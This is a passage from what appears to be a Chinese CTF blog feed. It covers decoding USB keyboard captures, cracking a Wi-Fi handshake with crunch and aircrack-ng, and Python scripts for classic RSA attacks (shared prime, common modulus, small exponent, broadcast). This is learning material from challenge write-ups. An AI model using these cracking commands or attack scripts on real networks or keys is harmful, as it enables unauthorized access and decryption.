class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">6</span>:<span class="number">8</span>]==<span class="string">&quot;00&quot;</span>:</span><br><span class="line">             <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">6</span>:<span class="number">8</span>] <span class="keyword">in</span> normalKeys.keys():</span><br><span class="line">            output += [[normalKeys[line[<span class="number">6</span>:<span class="number">8</span>]]],[shiftKeys[line[<span class="number">6</span>:<span class="number">8</span>]]]][line[<span class="number">1</span>]==<span class="string">&#x27;2&#x27;</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output += [<span class="string">&#x27;[unknown]&#x27;</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">keys.close()</span><br><span class="line"></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line">print(<span class="string">&quot;&quot;</span>.join(output))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a=output.index(<span class="string">&#x27;&lt;DEL&gt;&#x27;</span>)</span><br><span class="line">        <span class="keyword">del</span> output[a]</span><br><span class="line">        <span class="keyword">del</span> output[a<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> output[i]==<span class="string">&quot;&lt;CAP&gt;&quot;</span>:</span><br><span class="line">            flag+=<span class="number">1</span></span><br><span class="line">            output.pop(i)</span><br><span class="line">            <span class="keyword">if</span> flag==<span class="number">2</span>:</span><br><span class="line">                flag=<span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> flag!=<span class="number">0</span>:</span><br><span class="line">            output[i]=output[i].upper()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">&#x27;output :&#x27;</span> + <span class="string">&quot;&quot;</span>.join(output))</span><br></pre></td></tr></table></figure><h5 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h5><p>在kali下运行UsbKeyboardDataHacker一步到位</p><p>下载地址:<a href="https://github.com/WangYihang/UsbKeyboardDataHacker">https://github.com/WangYihang/UsbKeyboardDataHacker</a></p><h4 id="Bugku-想蹭网先解开密码"><a href="#Bugku-想蹭网先解开密码" class="headerlink" title="Bugku[想蹭网先解开密码]"></a>Bugku[想蹭网先解开密码]</h4><p>Wireshark过滤eapol协议的包，发现通过握手包可以对密码实现暴力破解</p><p>在kali中使用Crunch工具生成密码字典</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 11 11 -t 1391040%%%% -o password.txt</span><br></pre></td></tr></table></figure><p>使用aircrack -ng工具进行破解 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng wifi.cap -w password.txt</span><br></pre></td></tr></table></figure><p>-w后面接的是字典</p><p>得到flag</p><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://blog.csdn.net/qq_45555226/article/details/102810474">https://blog.csdn.net/qq_45555226/article/details/102810474</a></p><p><a href="https://blog.csdn.net/qq_44108455/article/details/108179086">https://blog.csdn.net/qq_44108455/article/details/108179086</a></p><p><a href="https://blog.csdn.net/qq_42025840/article/details/81125584">https://blog.csdn.net/qq_42025840/article/details/81125584</a></p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>RSAWP(中国剩余定理)</title>
      <link href="/2020/11/15/%E4%B8%AD%E5%9B%BD%E5%89%A9%E4%BD%99%E5%AE%9A%E7%90%86/"/>
      <url>/2020/11/15/%E4%B8%AD%E5%9B%BD%E5%89%A9%E4%BD%99%E5%AE%9A%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h5 id="题目-RSA-e与φ-n-不互素时"><a href="#题目-RSA-e与φ-n-不互素时" class="headerlink" title="题目:RSA-e与φ(n)不互素时"></a>题目:RSA-e与φ(n)不互素时</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">n1=<span class="number">0xcfc59d54b4b2e9ab1b5d90920ae88f430d39fee60d18dddbc623d15aae645e4e50db1c07a02d472b2eebb075a547618e1154a15b1657fbf66ed7e714d23ac70bdfba4c809bbb1e27687163cb09258a07ab2533568192e29a3b8e31a5de886050b28b3ed58e81952487714dd7ae012708db30eaf007620cdeb34f150836a4b723L</span></span><br><span class="line">e1=<span class="number">0xfae3aL</span></span><br><span class="line">c1=<span class="number">0x81523a330fb15125b6184e4461dadac7601340960840c5213b67a788c84aecfcdc3caf0bf3e27e4c95bb3c154db7055376981972b1565c22c100c47f3fa1dd2994e56090067b4e66f1c3905f9f780145cdf8d0fea88a45bae5113da37c8879c9cdb8ee9a55892bac3bae11fbbabcba0626163d0e2e12c04d99f4eeba5071cbeaL</span></span><br><span class="line">n2=<span class="number">0xd45304b186dc82e40bd387afc831c32a4c7ba514a64ae051b62f483f27951065a6a04a030d285bdc1cb457b24c2f8701f574094d46d8de37b5a6d55356d1d368b89e16fa71b6603bd037c7f329a3096ce903937bb0c4f112a678c88fd5d84016f745b8281aea8fd5bcc28b68c293e4ef4a62a62e478a8b6cd46f3da73fa34c63L</span></span><br><span class="line">e2=<span class="number">0x1f9eaeL</span></span><br><span class="line">c2=<span class="number">0x4d7ceaadf5e662ab2e0149a8d18a4777b4cd4a7712ab825cf913206c325e6abb88954ebc37b2bda19aed16c5938ac43f43966e96a86913129e38c853ecd4ebc89e806f823ffb802e3ddef0ac6c5ba078d3983393a91cd7a1b59660d47d2045c03ff529c341f3ed994235a68c57f8195f75d61fc8cac37e936d9a6b75c4bd2347L</span></span><br><span class="line"><span class="keyword">assert</span> pow(flag,e1,n1)==c1</span><br><span class="line"><span class="keyword">assert</span> pow(flag,e2,n2)==c2</span><br><span class="line"><span class="keyword">assert</span> gcd(e1,(p1<span class="number">-1</span>)*(q1<span class="number">-1</span>))==<span class="number">14</span></span><br><span class="line"><span class="keyword">assert</span> gcd(e2,(p2<span class="number">-1</span>)*(q2<span class="number">-1</span>))==<span class="number">14</span></span><br></pre></td></tr></table></figure><p>0x表示16进制，最后L表示为long型</p><h5 id="WP"><a href="#WP" class="headerlink" title="WP:"></a>WP:</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n1=<span class="number">0xcfc59d54b4b2e9ab1b5d90920ae88f430d39fee60d18dddbc623d15aae645e4e50db1c07a02d472b2eebb075a547618e1154a15b1657fbf66ed7e714d23ac70bdfba4c809bbb1e27687163cb09258a07ab2533568192e29a3b8e31a5de886050b28b3ed58e81952487714dd7ae012708db30eaf007620cdeb34f150836a4b723</span></span><br><span class="line">e1=<span class="number">0xfae3a</span></span><br><span class="line">c1=<span class="number">0x81523a330fb15125b6184e4461dadac7601340960840c5213b67a788c84aecfcdc3caf0bf3e27e4c95bb3c154db7055376981972b1565c22c100c47f3fa1dd2994e56090067b4e66f1c3905f9f780145cdf8d0fea88a45bae5113da37c8879c9cdb8ee9a55892bac3bae11fbbabcba0626163d0e2e12c04d99f4eeba5071cbea</span></span><br><span class="line">n2=<span class="number">0xd45304b186dc82e40bd387afc831c32a4c7ba514a64ae051b62f483f27951065a6a04a030d285bdc1cb457b24c2f8701f574094d46d8de37b5a6d55356d1d368b89e16fa71b6603bd037c7f329a3096ce903937bb0c4f112a678c88fd5d84016f745b8281aea8fd5bcc28b68c293e4ef4a62a62e478a8b6cd46f3da73fa34c63</span></span><br><span class="line">e2=<span class="number">0x1f9eae</span></span><br><span class="line">c2=<span class="number">0x4d7ceaadf5e662ab2e0149a8d18a4777b4cd4a7712ab825cf913206c325e6abb88954ebc37b2bda19aed16c5938ac43f43966e96a86913129e38c853ecd4ebc89e806f823ffb802e3ddef0ac6c5ba078d3983393a91cd7a1b59660d47d2045c03ff529c341f3ed994235a68c57f8195f75d61fc8cac37e936d9a6b75c4bd2347</span></span><br><span class="line"></span><br><span class="line">p=libnum.gcd(n1,n2)</span><br><span class="line">q1=gmpy2.mpz(n1//p)</span><br><span class="line">q2=gmpy2.mpz(n2//p)<span class="comment">#注意要用//整除不然计算出的结果会有误</span></span><br><span class="line">fn1=(p<span class="number">-1</span>)*(q1<span class="number">-1</span>)</span><br><span class="line">fn2=(p<span class="number">-1</span>)*(q2<span class="number">-1</span>)</span><br><span class="line">e1=gmpy2.mpz(e1//<span class="number">14</span>)</span><br><span class="line">e2=gmpy2.mpz(e2//<span class="number">14</span>)</span><br><span class="line">d1 = gmpy2.invert(e1,fn1)</span><br><span class="line">d2 = gmpy2.invert(e2,fn2)</span><br><span class="line"></span><br><span class="line">m1=pow(c1,d1,n1)</span><br><span class="line">m2=pow(c2,d2,n2)</span><br><span class="line">c=libnum.solve_crt([m1,m1,m2],[p,q1,q2])<span class="comment">#求解中国剩余定理</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print(libnum.gcd(14,(q1-1)*(q2-1)))</span></span><br><span class="line"><span class="comment">#由于存在公约数2，所以整个问题就化简为了e=7，c=...,n=...的新问题</span></span><br><span class="line">e=<span class="number">7</span></span><br><span class="line">n=q1*q2</span><br><span class="line">fn=(q1<span class="number">-1</span>)*(q2<span class="number">-1</span>)</span><br><span class="line">d=gmpy2.invert(e,fn)</span><br><span class="line">m=pow(c,d,n)</span><br><span class="line">t=gmpy2.iroot(m, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">print(libnum.n2s(t))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Crypto学习笔记(RSA攻击脚本实现)</title>
      <link href="/2020/11/08/RSA%E5%9F%BA%E6%9C%AC%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC/"/>
      <url>/2020/11/08/RSA%E5%9F%BA%E6%9C%AC%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<h4 id="gmpy2相关函数"><a href="#gmpy2相关函数" class="headerlink" title="gmpy2相关函数"></a>gmpy2相关函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">gmpy2.mpz(n)<span class="comment">#初始化一个大整数</span></span><br><span class="line">gmpy2.mpfr(x)<span class="comment"># 初始化一个高精度浮点数x</span></span><br><span class="line">d = gmpy2.invert(e,n) <span class="comment"># 求逆元，de = 1 mod n</span></span><br><span class="line">C = gmpy2.powmod(M,e,n)<span class="comment"># 幂取模，结果是 C = (M^e) mod n</span></span><br><span class="line">gmpy2.is_prime(n) <span class="comment">#素性检测</span></span><br><span class="line">gmpy2.gcd(a,b) <span class="comment">#欧几里得算法，最大公约数</span></span><br><span class="line">gmpy2.gcdext(a,b) <span class="comment">#扩展欧几里得算法</span></span><br><span class="line">gmpy2.iroot(x,n) <span class="comment">#x开n次根 返回的第一个值表示开方后结果 第二个值表示是否能开尽</span></span><br></pre></td></tr></table></figure><h4 id="各方信息"><a href="#各方信息" class="headerlink" title="各方信息"></a>各方信息</h4><p>通信者A(解密方):掌握全部数据  p、q、公钥(n，e)、密文c </p><p>通信者B(加密方): 公钥(e，n)、密文c、明文m</p><p>攻击者C:公钥(e，n）、密文c</p><p>通信者A通过p、q计算得到d然后根据私钥（e，n）解出明文m</p><h4 id="解密者角度"><a href="#解密者角度" class="headerlink" title="解密者角度"></a>解密者角度</h4><h5 id="1-已知p、q、e求d"><a href="#1-已知p、q、e求d" class="headerlink" title="1.已知p、q、e求d"></a>1.已知p、q、e求d</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">p = <span class="number">473398607161</span></span><br><span class="line">q = <span class="number">4511491</span></span><br><span class="line">e = <span class="number">17</span></span><br><span class="line">d = libnum.modular.invmod(e, (p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">print(d)</span><br><span class="line"></span><br><span class="line"><span class="comment">##通过primefac也可以实现求d 不过prime只支持python2环境</span></span><br><span class="line"><span class="keyword">import</span> primefac</span><br><span class="line">d=prime.modinv(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))%((p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">##通过gmpy2也可以实现求d</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="comment">#其中gmpy2.mpz()函数起初始化大整数的作用</span></span><br><span class="line">p=gmpy2.mpz($p) </span><br><span class="line">q=gmpy2.mpz($q)</span><br><span class="line">e=gmpy2.mpz($e)</span><br><span class="line">d=gmpy2.invert(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">print(d)</span><br></pre></td></tr></table></figure><h4 id="攻击者角度"><a href="#攻击者角度" class="headerlink" title="攻击者角度"></a>攻击者角度</h4><p>攻击者与解密者的信息差距往往就是p、q，其目标往往是获取密文m</p><h5 id="模数分解"><a href="#模数分解" class="headerlink" title="模数分解"></a>模数分解</h5><p>1 对于n比较小(256bit)的情况，可以通过yafu直接模数分解n，通过p、q、e求得d，而后</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to bytes</span><br><span class="line">m=pow(c,d,n)</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line"><span class="comment">#long_to_bytes实现将m转化为字符串</span></span><br></pre></td></tr></table></figure><p>2 yafu的分解同时集成了<a href="https://en.wikipedia.org/wiki/Fermat&#39;s_factorization_method">费马分解</a>和<a href="https://en.wikipedia.org/wiki/Pollard&#39;s_rho_algorithm">Pollard_rho分解</a>，所以有的时候即使n的长度是1024bit，也会由于其中一个素因子太小或两个因子相差不大成功分解。</p><p>3 公约数模数分解</p><p>进行两次通信会产生两个n，如果通信者A在两次通信中生成的大素数有一个是相同的，那攻击者C就可以对两次的n进行公约数计算从而得到n</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p&#x3D;gmpy2.gcd(n1,n2)</span><br><span class="line">q1&#x3D;n1&#x2F;p</span><br><span class="line">q2&#x3D;n2&#x2F;p</span><br></pre></td></tr></table></figure><h5 id="小指数明文爆破"><a href="#小指数明文爆破" class="headerlink" title="小指数明文爆破"></a>小指数明文爆破</h5><p>加密方B得到A的公钥(n，e)，如果e比较小，则会$m^e&lt;n$,则$c=m^e$ 此时直接对c开e次方就得到m，但有时候并不是这么极端 但可能$m^e$也没有超过n太多，于是可以爆破出m</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long, getPrime, isPrime</span><br><span class="line">n = <span class="number">47966708183289639962501363163761864399454241691014467172805658518368423135168025285144721028476297179341434450931955275325060173656301959484440112740411109153032840150659</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="number">10968126341413081941567552025256642365567988931403833266852196599058668508079150528128483441934584299102782386592369069626088211004467782012298322278772376088171342152839</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">  <span class="keyword">if</span> (gmpy2.iroot(c + i * n, <span class="number">3</span>)[<span class="number">1</span>] == <span class="number">1</span>):<span class="comment">#第二个参数[1]判断能否开尽</span></span><br><span class="line">    print(long_to_bytes(gmpy2.iroot(c + i * n, <span class="number">3</span>)[<span class="number">0</span>]))<span class="comment">#第一个参数[0]表示开方后得到的数</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  i = i + <span class="number">1</span></span><br></pre></td></tr></table></figure><h5 id="选择密文攻击"><a href="#选择密文攻击" class="headerlink" title="选择密文攻击"></a>选择密文攻击</h5><p>攻击方可以对任意密文解密，除了C。那可以先求出C在N上的逆元$C^{-1}$,然后求$C^{-1}$的明文$M^{‘}$,$M^{‘}$即为明文M的逆元。</p><h5 id="LLL-attack"><a href="#LLL-attack" class="headerlink" title="LLL-attack"></a>LLL-attack</h5><p>e太小，m部分泄露或者p泄露三分之二的情况下使用。用于LLLattack的<a href="https://github.com/mimoo/RSA-and-LLL-attacks">sage代码</a>。</p><h5 id="Wiener-Attack-amp-Boneh-Durfee-Attack"><a href="#Wiener-Attack-amp-Boneh-Durfee-Attack" class="headerlink" title="Wiener Attack &amp; Boneh Durfee Attack"></a>Wiener Attack &amp; Boneh Durfee Attack</h5><p>一般e很大，远超65537，就基本可以确定是Wiener Attack。可以采用<a href="https://github.com/pablocelayes/rsa-wiener-attack">维纳攻击脚本</a>。</p><h5 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h5><p>A在两次通信中采用相同的n，B对相同的m进行加密。采用以下脚本解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes,bytes_to_long,getPrime,isPrime</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">same_n_attack</span>(<span class="params">n,e1,e2,c1,c2</span>):</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">        x, lastX = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">        y, lastY = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> (b != <span class="number">0</span>):</span><br><span class="line">            q = a // b   <span class="comment">#整除</span></span><br><span class="line">            a, b = b, a % b</span><br><span class="line">            x, lastX = lastX - q * x, x</span><br><span class="line">            y, lastY = lastY - q * y, y</span><br><span class="line">        <span class="keyword">return</span> (lastX, lastY)</span><br><span class="line"></span><br><span class="line">    s = egcd(e1, e2)</span><br><span class="line">    s1 = s[<span class="number">0</span>]</span><br><span class="line">    s2 = s[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">        s1 = - s1</span><br><span class="line">        c1 = gmpy2.invert(c1, n)</span><br><span class="line">        <span class="keyword">if</span> c1&lt;<span class="number">0</span>:</span><br><span class="line">            c1+=n</span><br><span class="line">    <span class="keyword">elif</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">        s2 = - s2</span><br><span class="line">        c2 = gmpy2.invert(c2, n)</span><br><span class="line">        <span class="keyword">if</span> c2&lt;<span class="number">0</span>:</span><br><span class="line">            c2+=n</span><br><span class="line">    m=(pow(c1,s1,n)*pow(c2,s2,n)) % n</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line">n1=<span class="number">21660190931013270559487983141966347279666044468572000325628282578595119101840917794617733535995976710097702806131277006786522442555607842485975616689297559583352413160087163656851019769465637856967511819803473940154712516380580146620018921406354668604523723340895843009899397618067679200188650754096242296166060735958270930743173912010852467114047301529983496669250671342730804149428700280401481421735184899965468191802844285699985370238528163505674350380528600143880619512293622576854525700785474101747293316814980311297382429844950643977825771268757304088259531258222093667847468898823367251824316888563269155865061</span></span><br><span class="line">e1=<span class="number">65537</span></span><br><span class="line">c1=<span class="number">11623242520063564721509699039034210329314238234068836130756457335142671659158578379060500554276831657322012285562047706736377103534543565179660863796496071187533860896148153856845638989384429658963134915230898572173720454271369543435708994457280819363318783413033774014447450648051500214508699056865320506104733203716242071136228269326451412159760818676814129428252523248822316633339393821052614033884661649376604245744651142959498917235138077366818109892738298251161767344501687113868331134288984466294415889635863660753717476594011236542159800099371872396181448655448842148998667568104710807411358117939831241620315</span></span><br><span class="line">n2=<span class="number">21660190931013270559487983141966347279666044468572000325628282578595119101840917794617733535995976710097702806131277006786522442555607842485975616689297559583352413160087163656851019769465637856967511819803473940154712516380580146620018921406354668604523723340895843009899397618067679200188650754096242296166060735958270930743173912010852467114047301529983496669250671342730804149428700280401481421735184899965468191802844285699985370238528163505674350380528600143880619512293622576854525700785474101747293316814980311297382429844950643977825771268757304088259531258222093667847468898823367251824316888563269155865061</span></span><br><span class="line">e2=<span class="number">70001</span></span><br><span class="line">c2=<span class="number">8180690717251057689732022736872836938270075717486355807317876695012318283159440935866297644561407238807004565510263413544530421072353735781284166685919420305808123063907272925594909852212249704923889776430284878600408776341129645414000647100303326242514023325498519509077311907161849407990649396330146146728447312754091670139159346316264091798623764434932753276554781692238428057951593104821823029665203821775755835076337570281155689527215367647821372680421305939449511621244288104229290161484649056505784641486376741409443450331991557221540050574024894427139331416236263783977068315294198184169154352536388685040531</span></span><br><span class="line"><span class="keyword">print</span> (long_to_bytes(same_n_attack(n1,e1,e2,c1,c2)))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="广播攻击"><a href="#广播攻击" class="headerlink" title="广播攻击"></a>广播攻击</h5><p>加密的过程中e较小，且这几次加密过程中 ，加密信息相同，即</p><script type="math/tex; mode=display">c_1\equiv m^e\mod n_1\\c_2\equiv m^e\mod n_2\\c_3\equiv m^e\mod n_3</script><p>那么通过<a href="[https://zh.wikipedia.org/zh-hans/%E4%B8%AD%E5%9B%BD%E5%89%A9%E4%BD%99%E5%AE%9A%E7%90%86](https://zh.wikipedia.org/zh-hans/中国剩余定理">中国剩余定理</a>)，计算$c_x\equiv m^3\mod n_1n_2n_3$,然后对$c_x$开e次方根得到m</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line">n1 = <span class="number">24451423288348328116705189839080049401203825573696682939697089229515670854259668024738917571672083091736391032222439276176190670330149788177234868093407333559601300076140811141390059132774991537248278852195374559377914946861163565102316087142050792987559132773464700849304645152015574005517342653095585568809642839372678062663523564820583166717521739237792276166111668361172039147292768193129632684171172002382830408379067354719706121993642173739213280355600134781117773160460528207346288478815871296055864733062408148349209845936379646848651625713969508821074528754713838207135211670970387019665490891554278609420811</span></span><br><span class="line">e1 = <span class="number">3</span></span><br><span class="line">c1 = <span class="number">15739875616514630953136118518167425336566344729401649295136386816279793948062937416837879973892217898183001604612634670589995445217883630705454669275572015747596408894160611264926362963690714019483949272102316017165459832305673786710006588680357259384309205799575411881386856841704490851908762197421112221154073096284400634344102924080733996136266689995846872435464641531701655540246069568899209408835603371228683787516867834686720338208876553150308049787749151860312456421834317148300953317025532490631516416557696361667176077040251336722246089493549323185006889559952252279223464226121335279699764156011687694705461</span></span><br><span class="line"></span><br><span class="line">n2 = <span class="number">26371477190418742303888775088555323015207366776923126851773114394065723645672368088814181502360410900641156468215436455676418853504498893778165004679238083105115284038962860549618453609620564211541961829192628570279313244745190283361932206525212450405965917102560591225166296026203946023621569117063731896380036557814205848678875929376998512733964346619930409595564029979283595842765495546420008144195139735377286287069524605209733051251754274764107934939709473307270046001810101986138988618191726147463699979330655595693169524011001045064479429960522005088680268206848597198271413010280267566035795254656463702698823</span></span><br><span class="line">e2 = <span class="number">3</span></span><br><span class="line">c2 = <span class="number">24491112204092744341358638089215970530809389175921723500286573918429636398447936137595118862398236862698779775682952162653546124550629784165964386769387726103595283121496975198529062258433280603856760220088192538482626338903512801906921311030654216689591936509151350395249697750541120735732723071144598196884071338084546259983640953398715738096470608250955118848652845310318107343620885777444921011193265422744126912733993340865179850073221405567439254502574578925781409459433294016640150862732200176452820665011738329510188452740687455054869063245100602567671645540401390791588456748406543904714454899841545079587056</span></span><br><span class="line"></span><br><span class="line">n3 = <span class="number">27487047904330959883767333331462030929928491213958156653308086307319240141800614908094361257431882391215313284438555713825838241511527538964789800420812050047003596770148880871768715848882256199410164419506052779212555843479717842656396150794330441002831153507102960164073640832600708150242550799365929109808430251649175060381698677302608174255794872628187783088414186634174367531662043643358473337581486905937469115169466276315070659112396585619309358563546478189304744220858913259592690589213905377550443295883410708775472142360727764158039142452443204569417848208594378792577246174638639911159712430937128321437067</span></span><br><span class="line">e3 = <span class="number">3</span></span><br><span class="line">c3 = <span class="number">1657721854648476317520442150896650605711954769246991233391881094037826060908691858031485703087740392488258133124921363936766424042899719887649974751632127107022899794941279627494196541358161346953558285922698679387524282160943205189313406083166270966025941354796192171615197811422473937679394910921908268579426452496116103480709293429547721026538860977229195889575005308631157579567095561669277297494272383133948347665024419752146336618756926080138955963546588675787675378048078021878779569010236088293191739741596470893703755598233769968042607918446569365734945861279726941898996019192367675358423090129022372729450</span></span><br><span class="line">m1, m2, m3 = invert(n2 * n3, n1), invert(n1 * n3, n2), invert(n1 * n2, n3)</span><br><span class="line">x = (c1 * (m1 % n1) * n2 * n3 + c2 * (m2 % n2) * n1 * n3 + c3 * (m3 % n3) * n2 * n1) % (n1 * n2 * n3)</span><br><span class="line"><span class="comment"># print(x)</span></span><br><span class="line">m, n = iroot(x, e1)</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure><h5 id="相关消息攻击"><a href="#相关消息攻击" class="headerlink" title="相关消息攻击"></a>相关消息攻击</h5><p>加密者B使用同一公钥对两个具有某种线性关系的消息m1,m2进行加密 得到c1,c2。</p><p>假设模数为N，两种之间的线性关系为$M_1=a*M_2+b$，则当e=3时，则有</p><script type="math/tex; 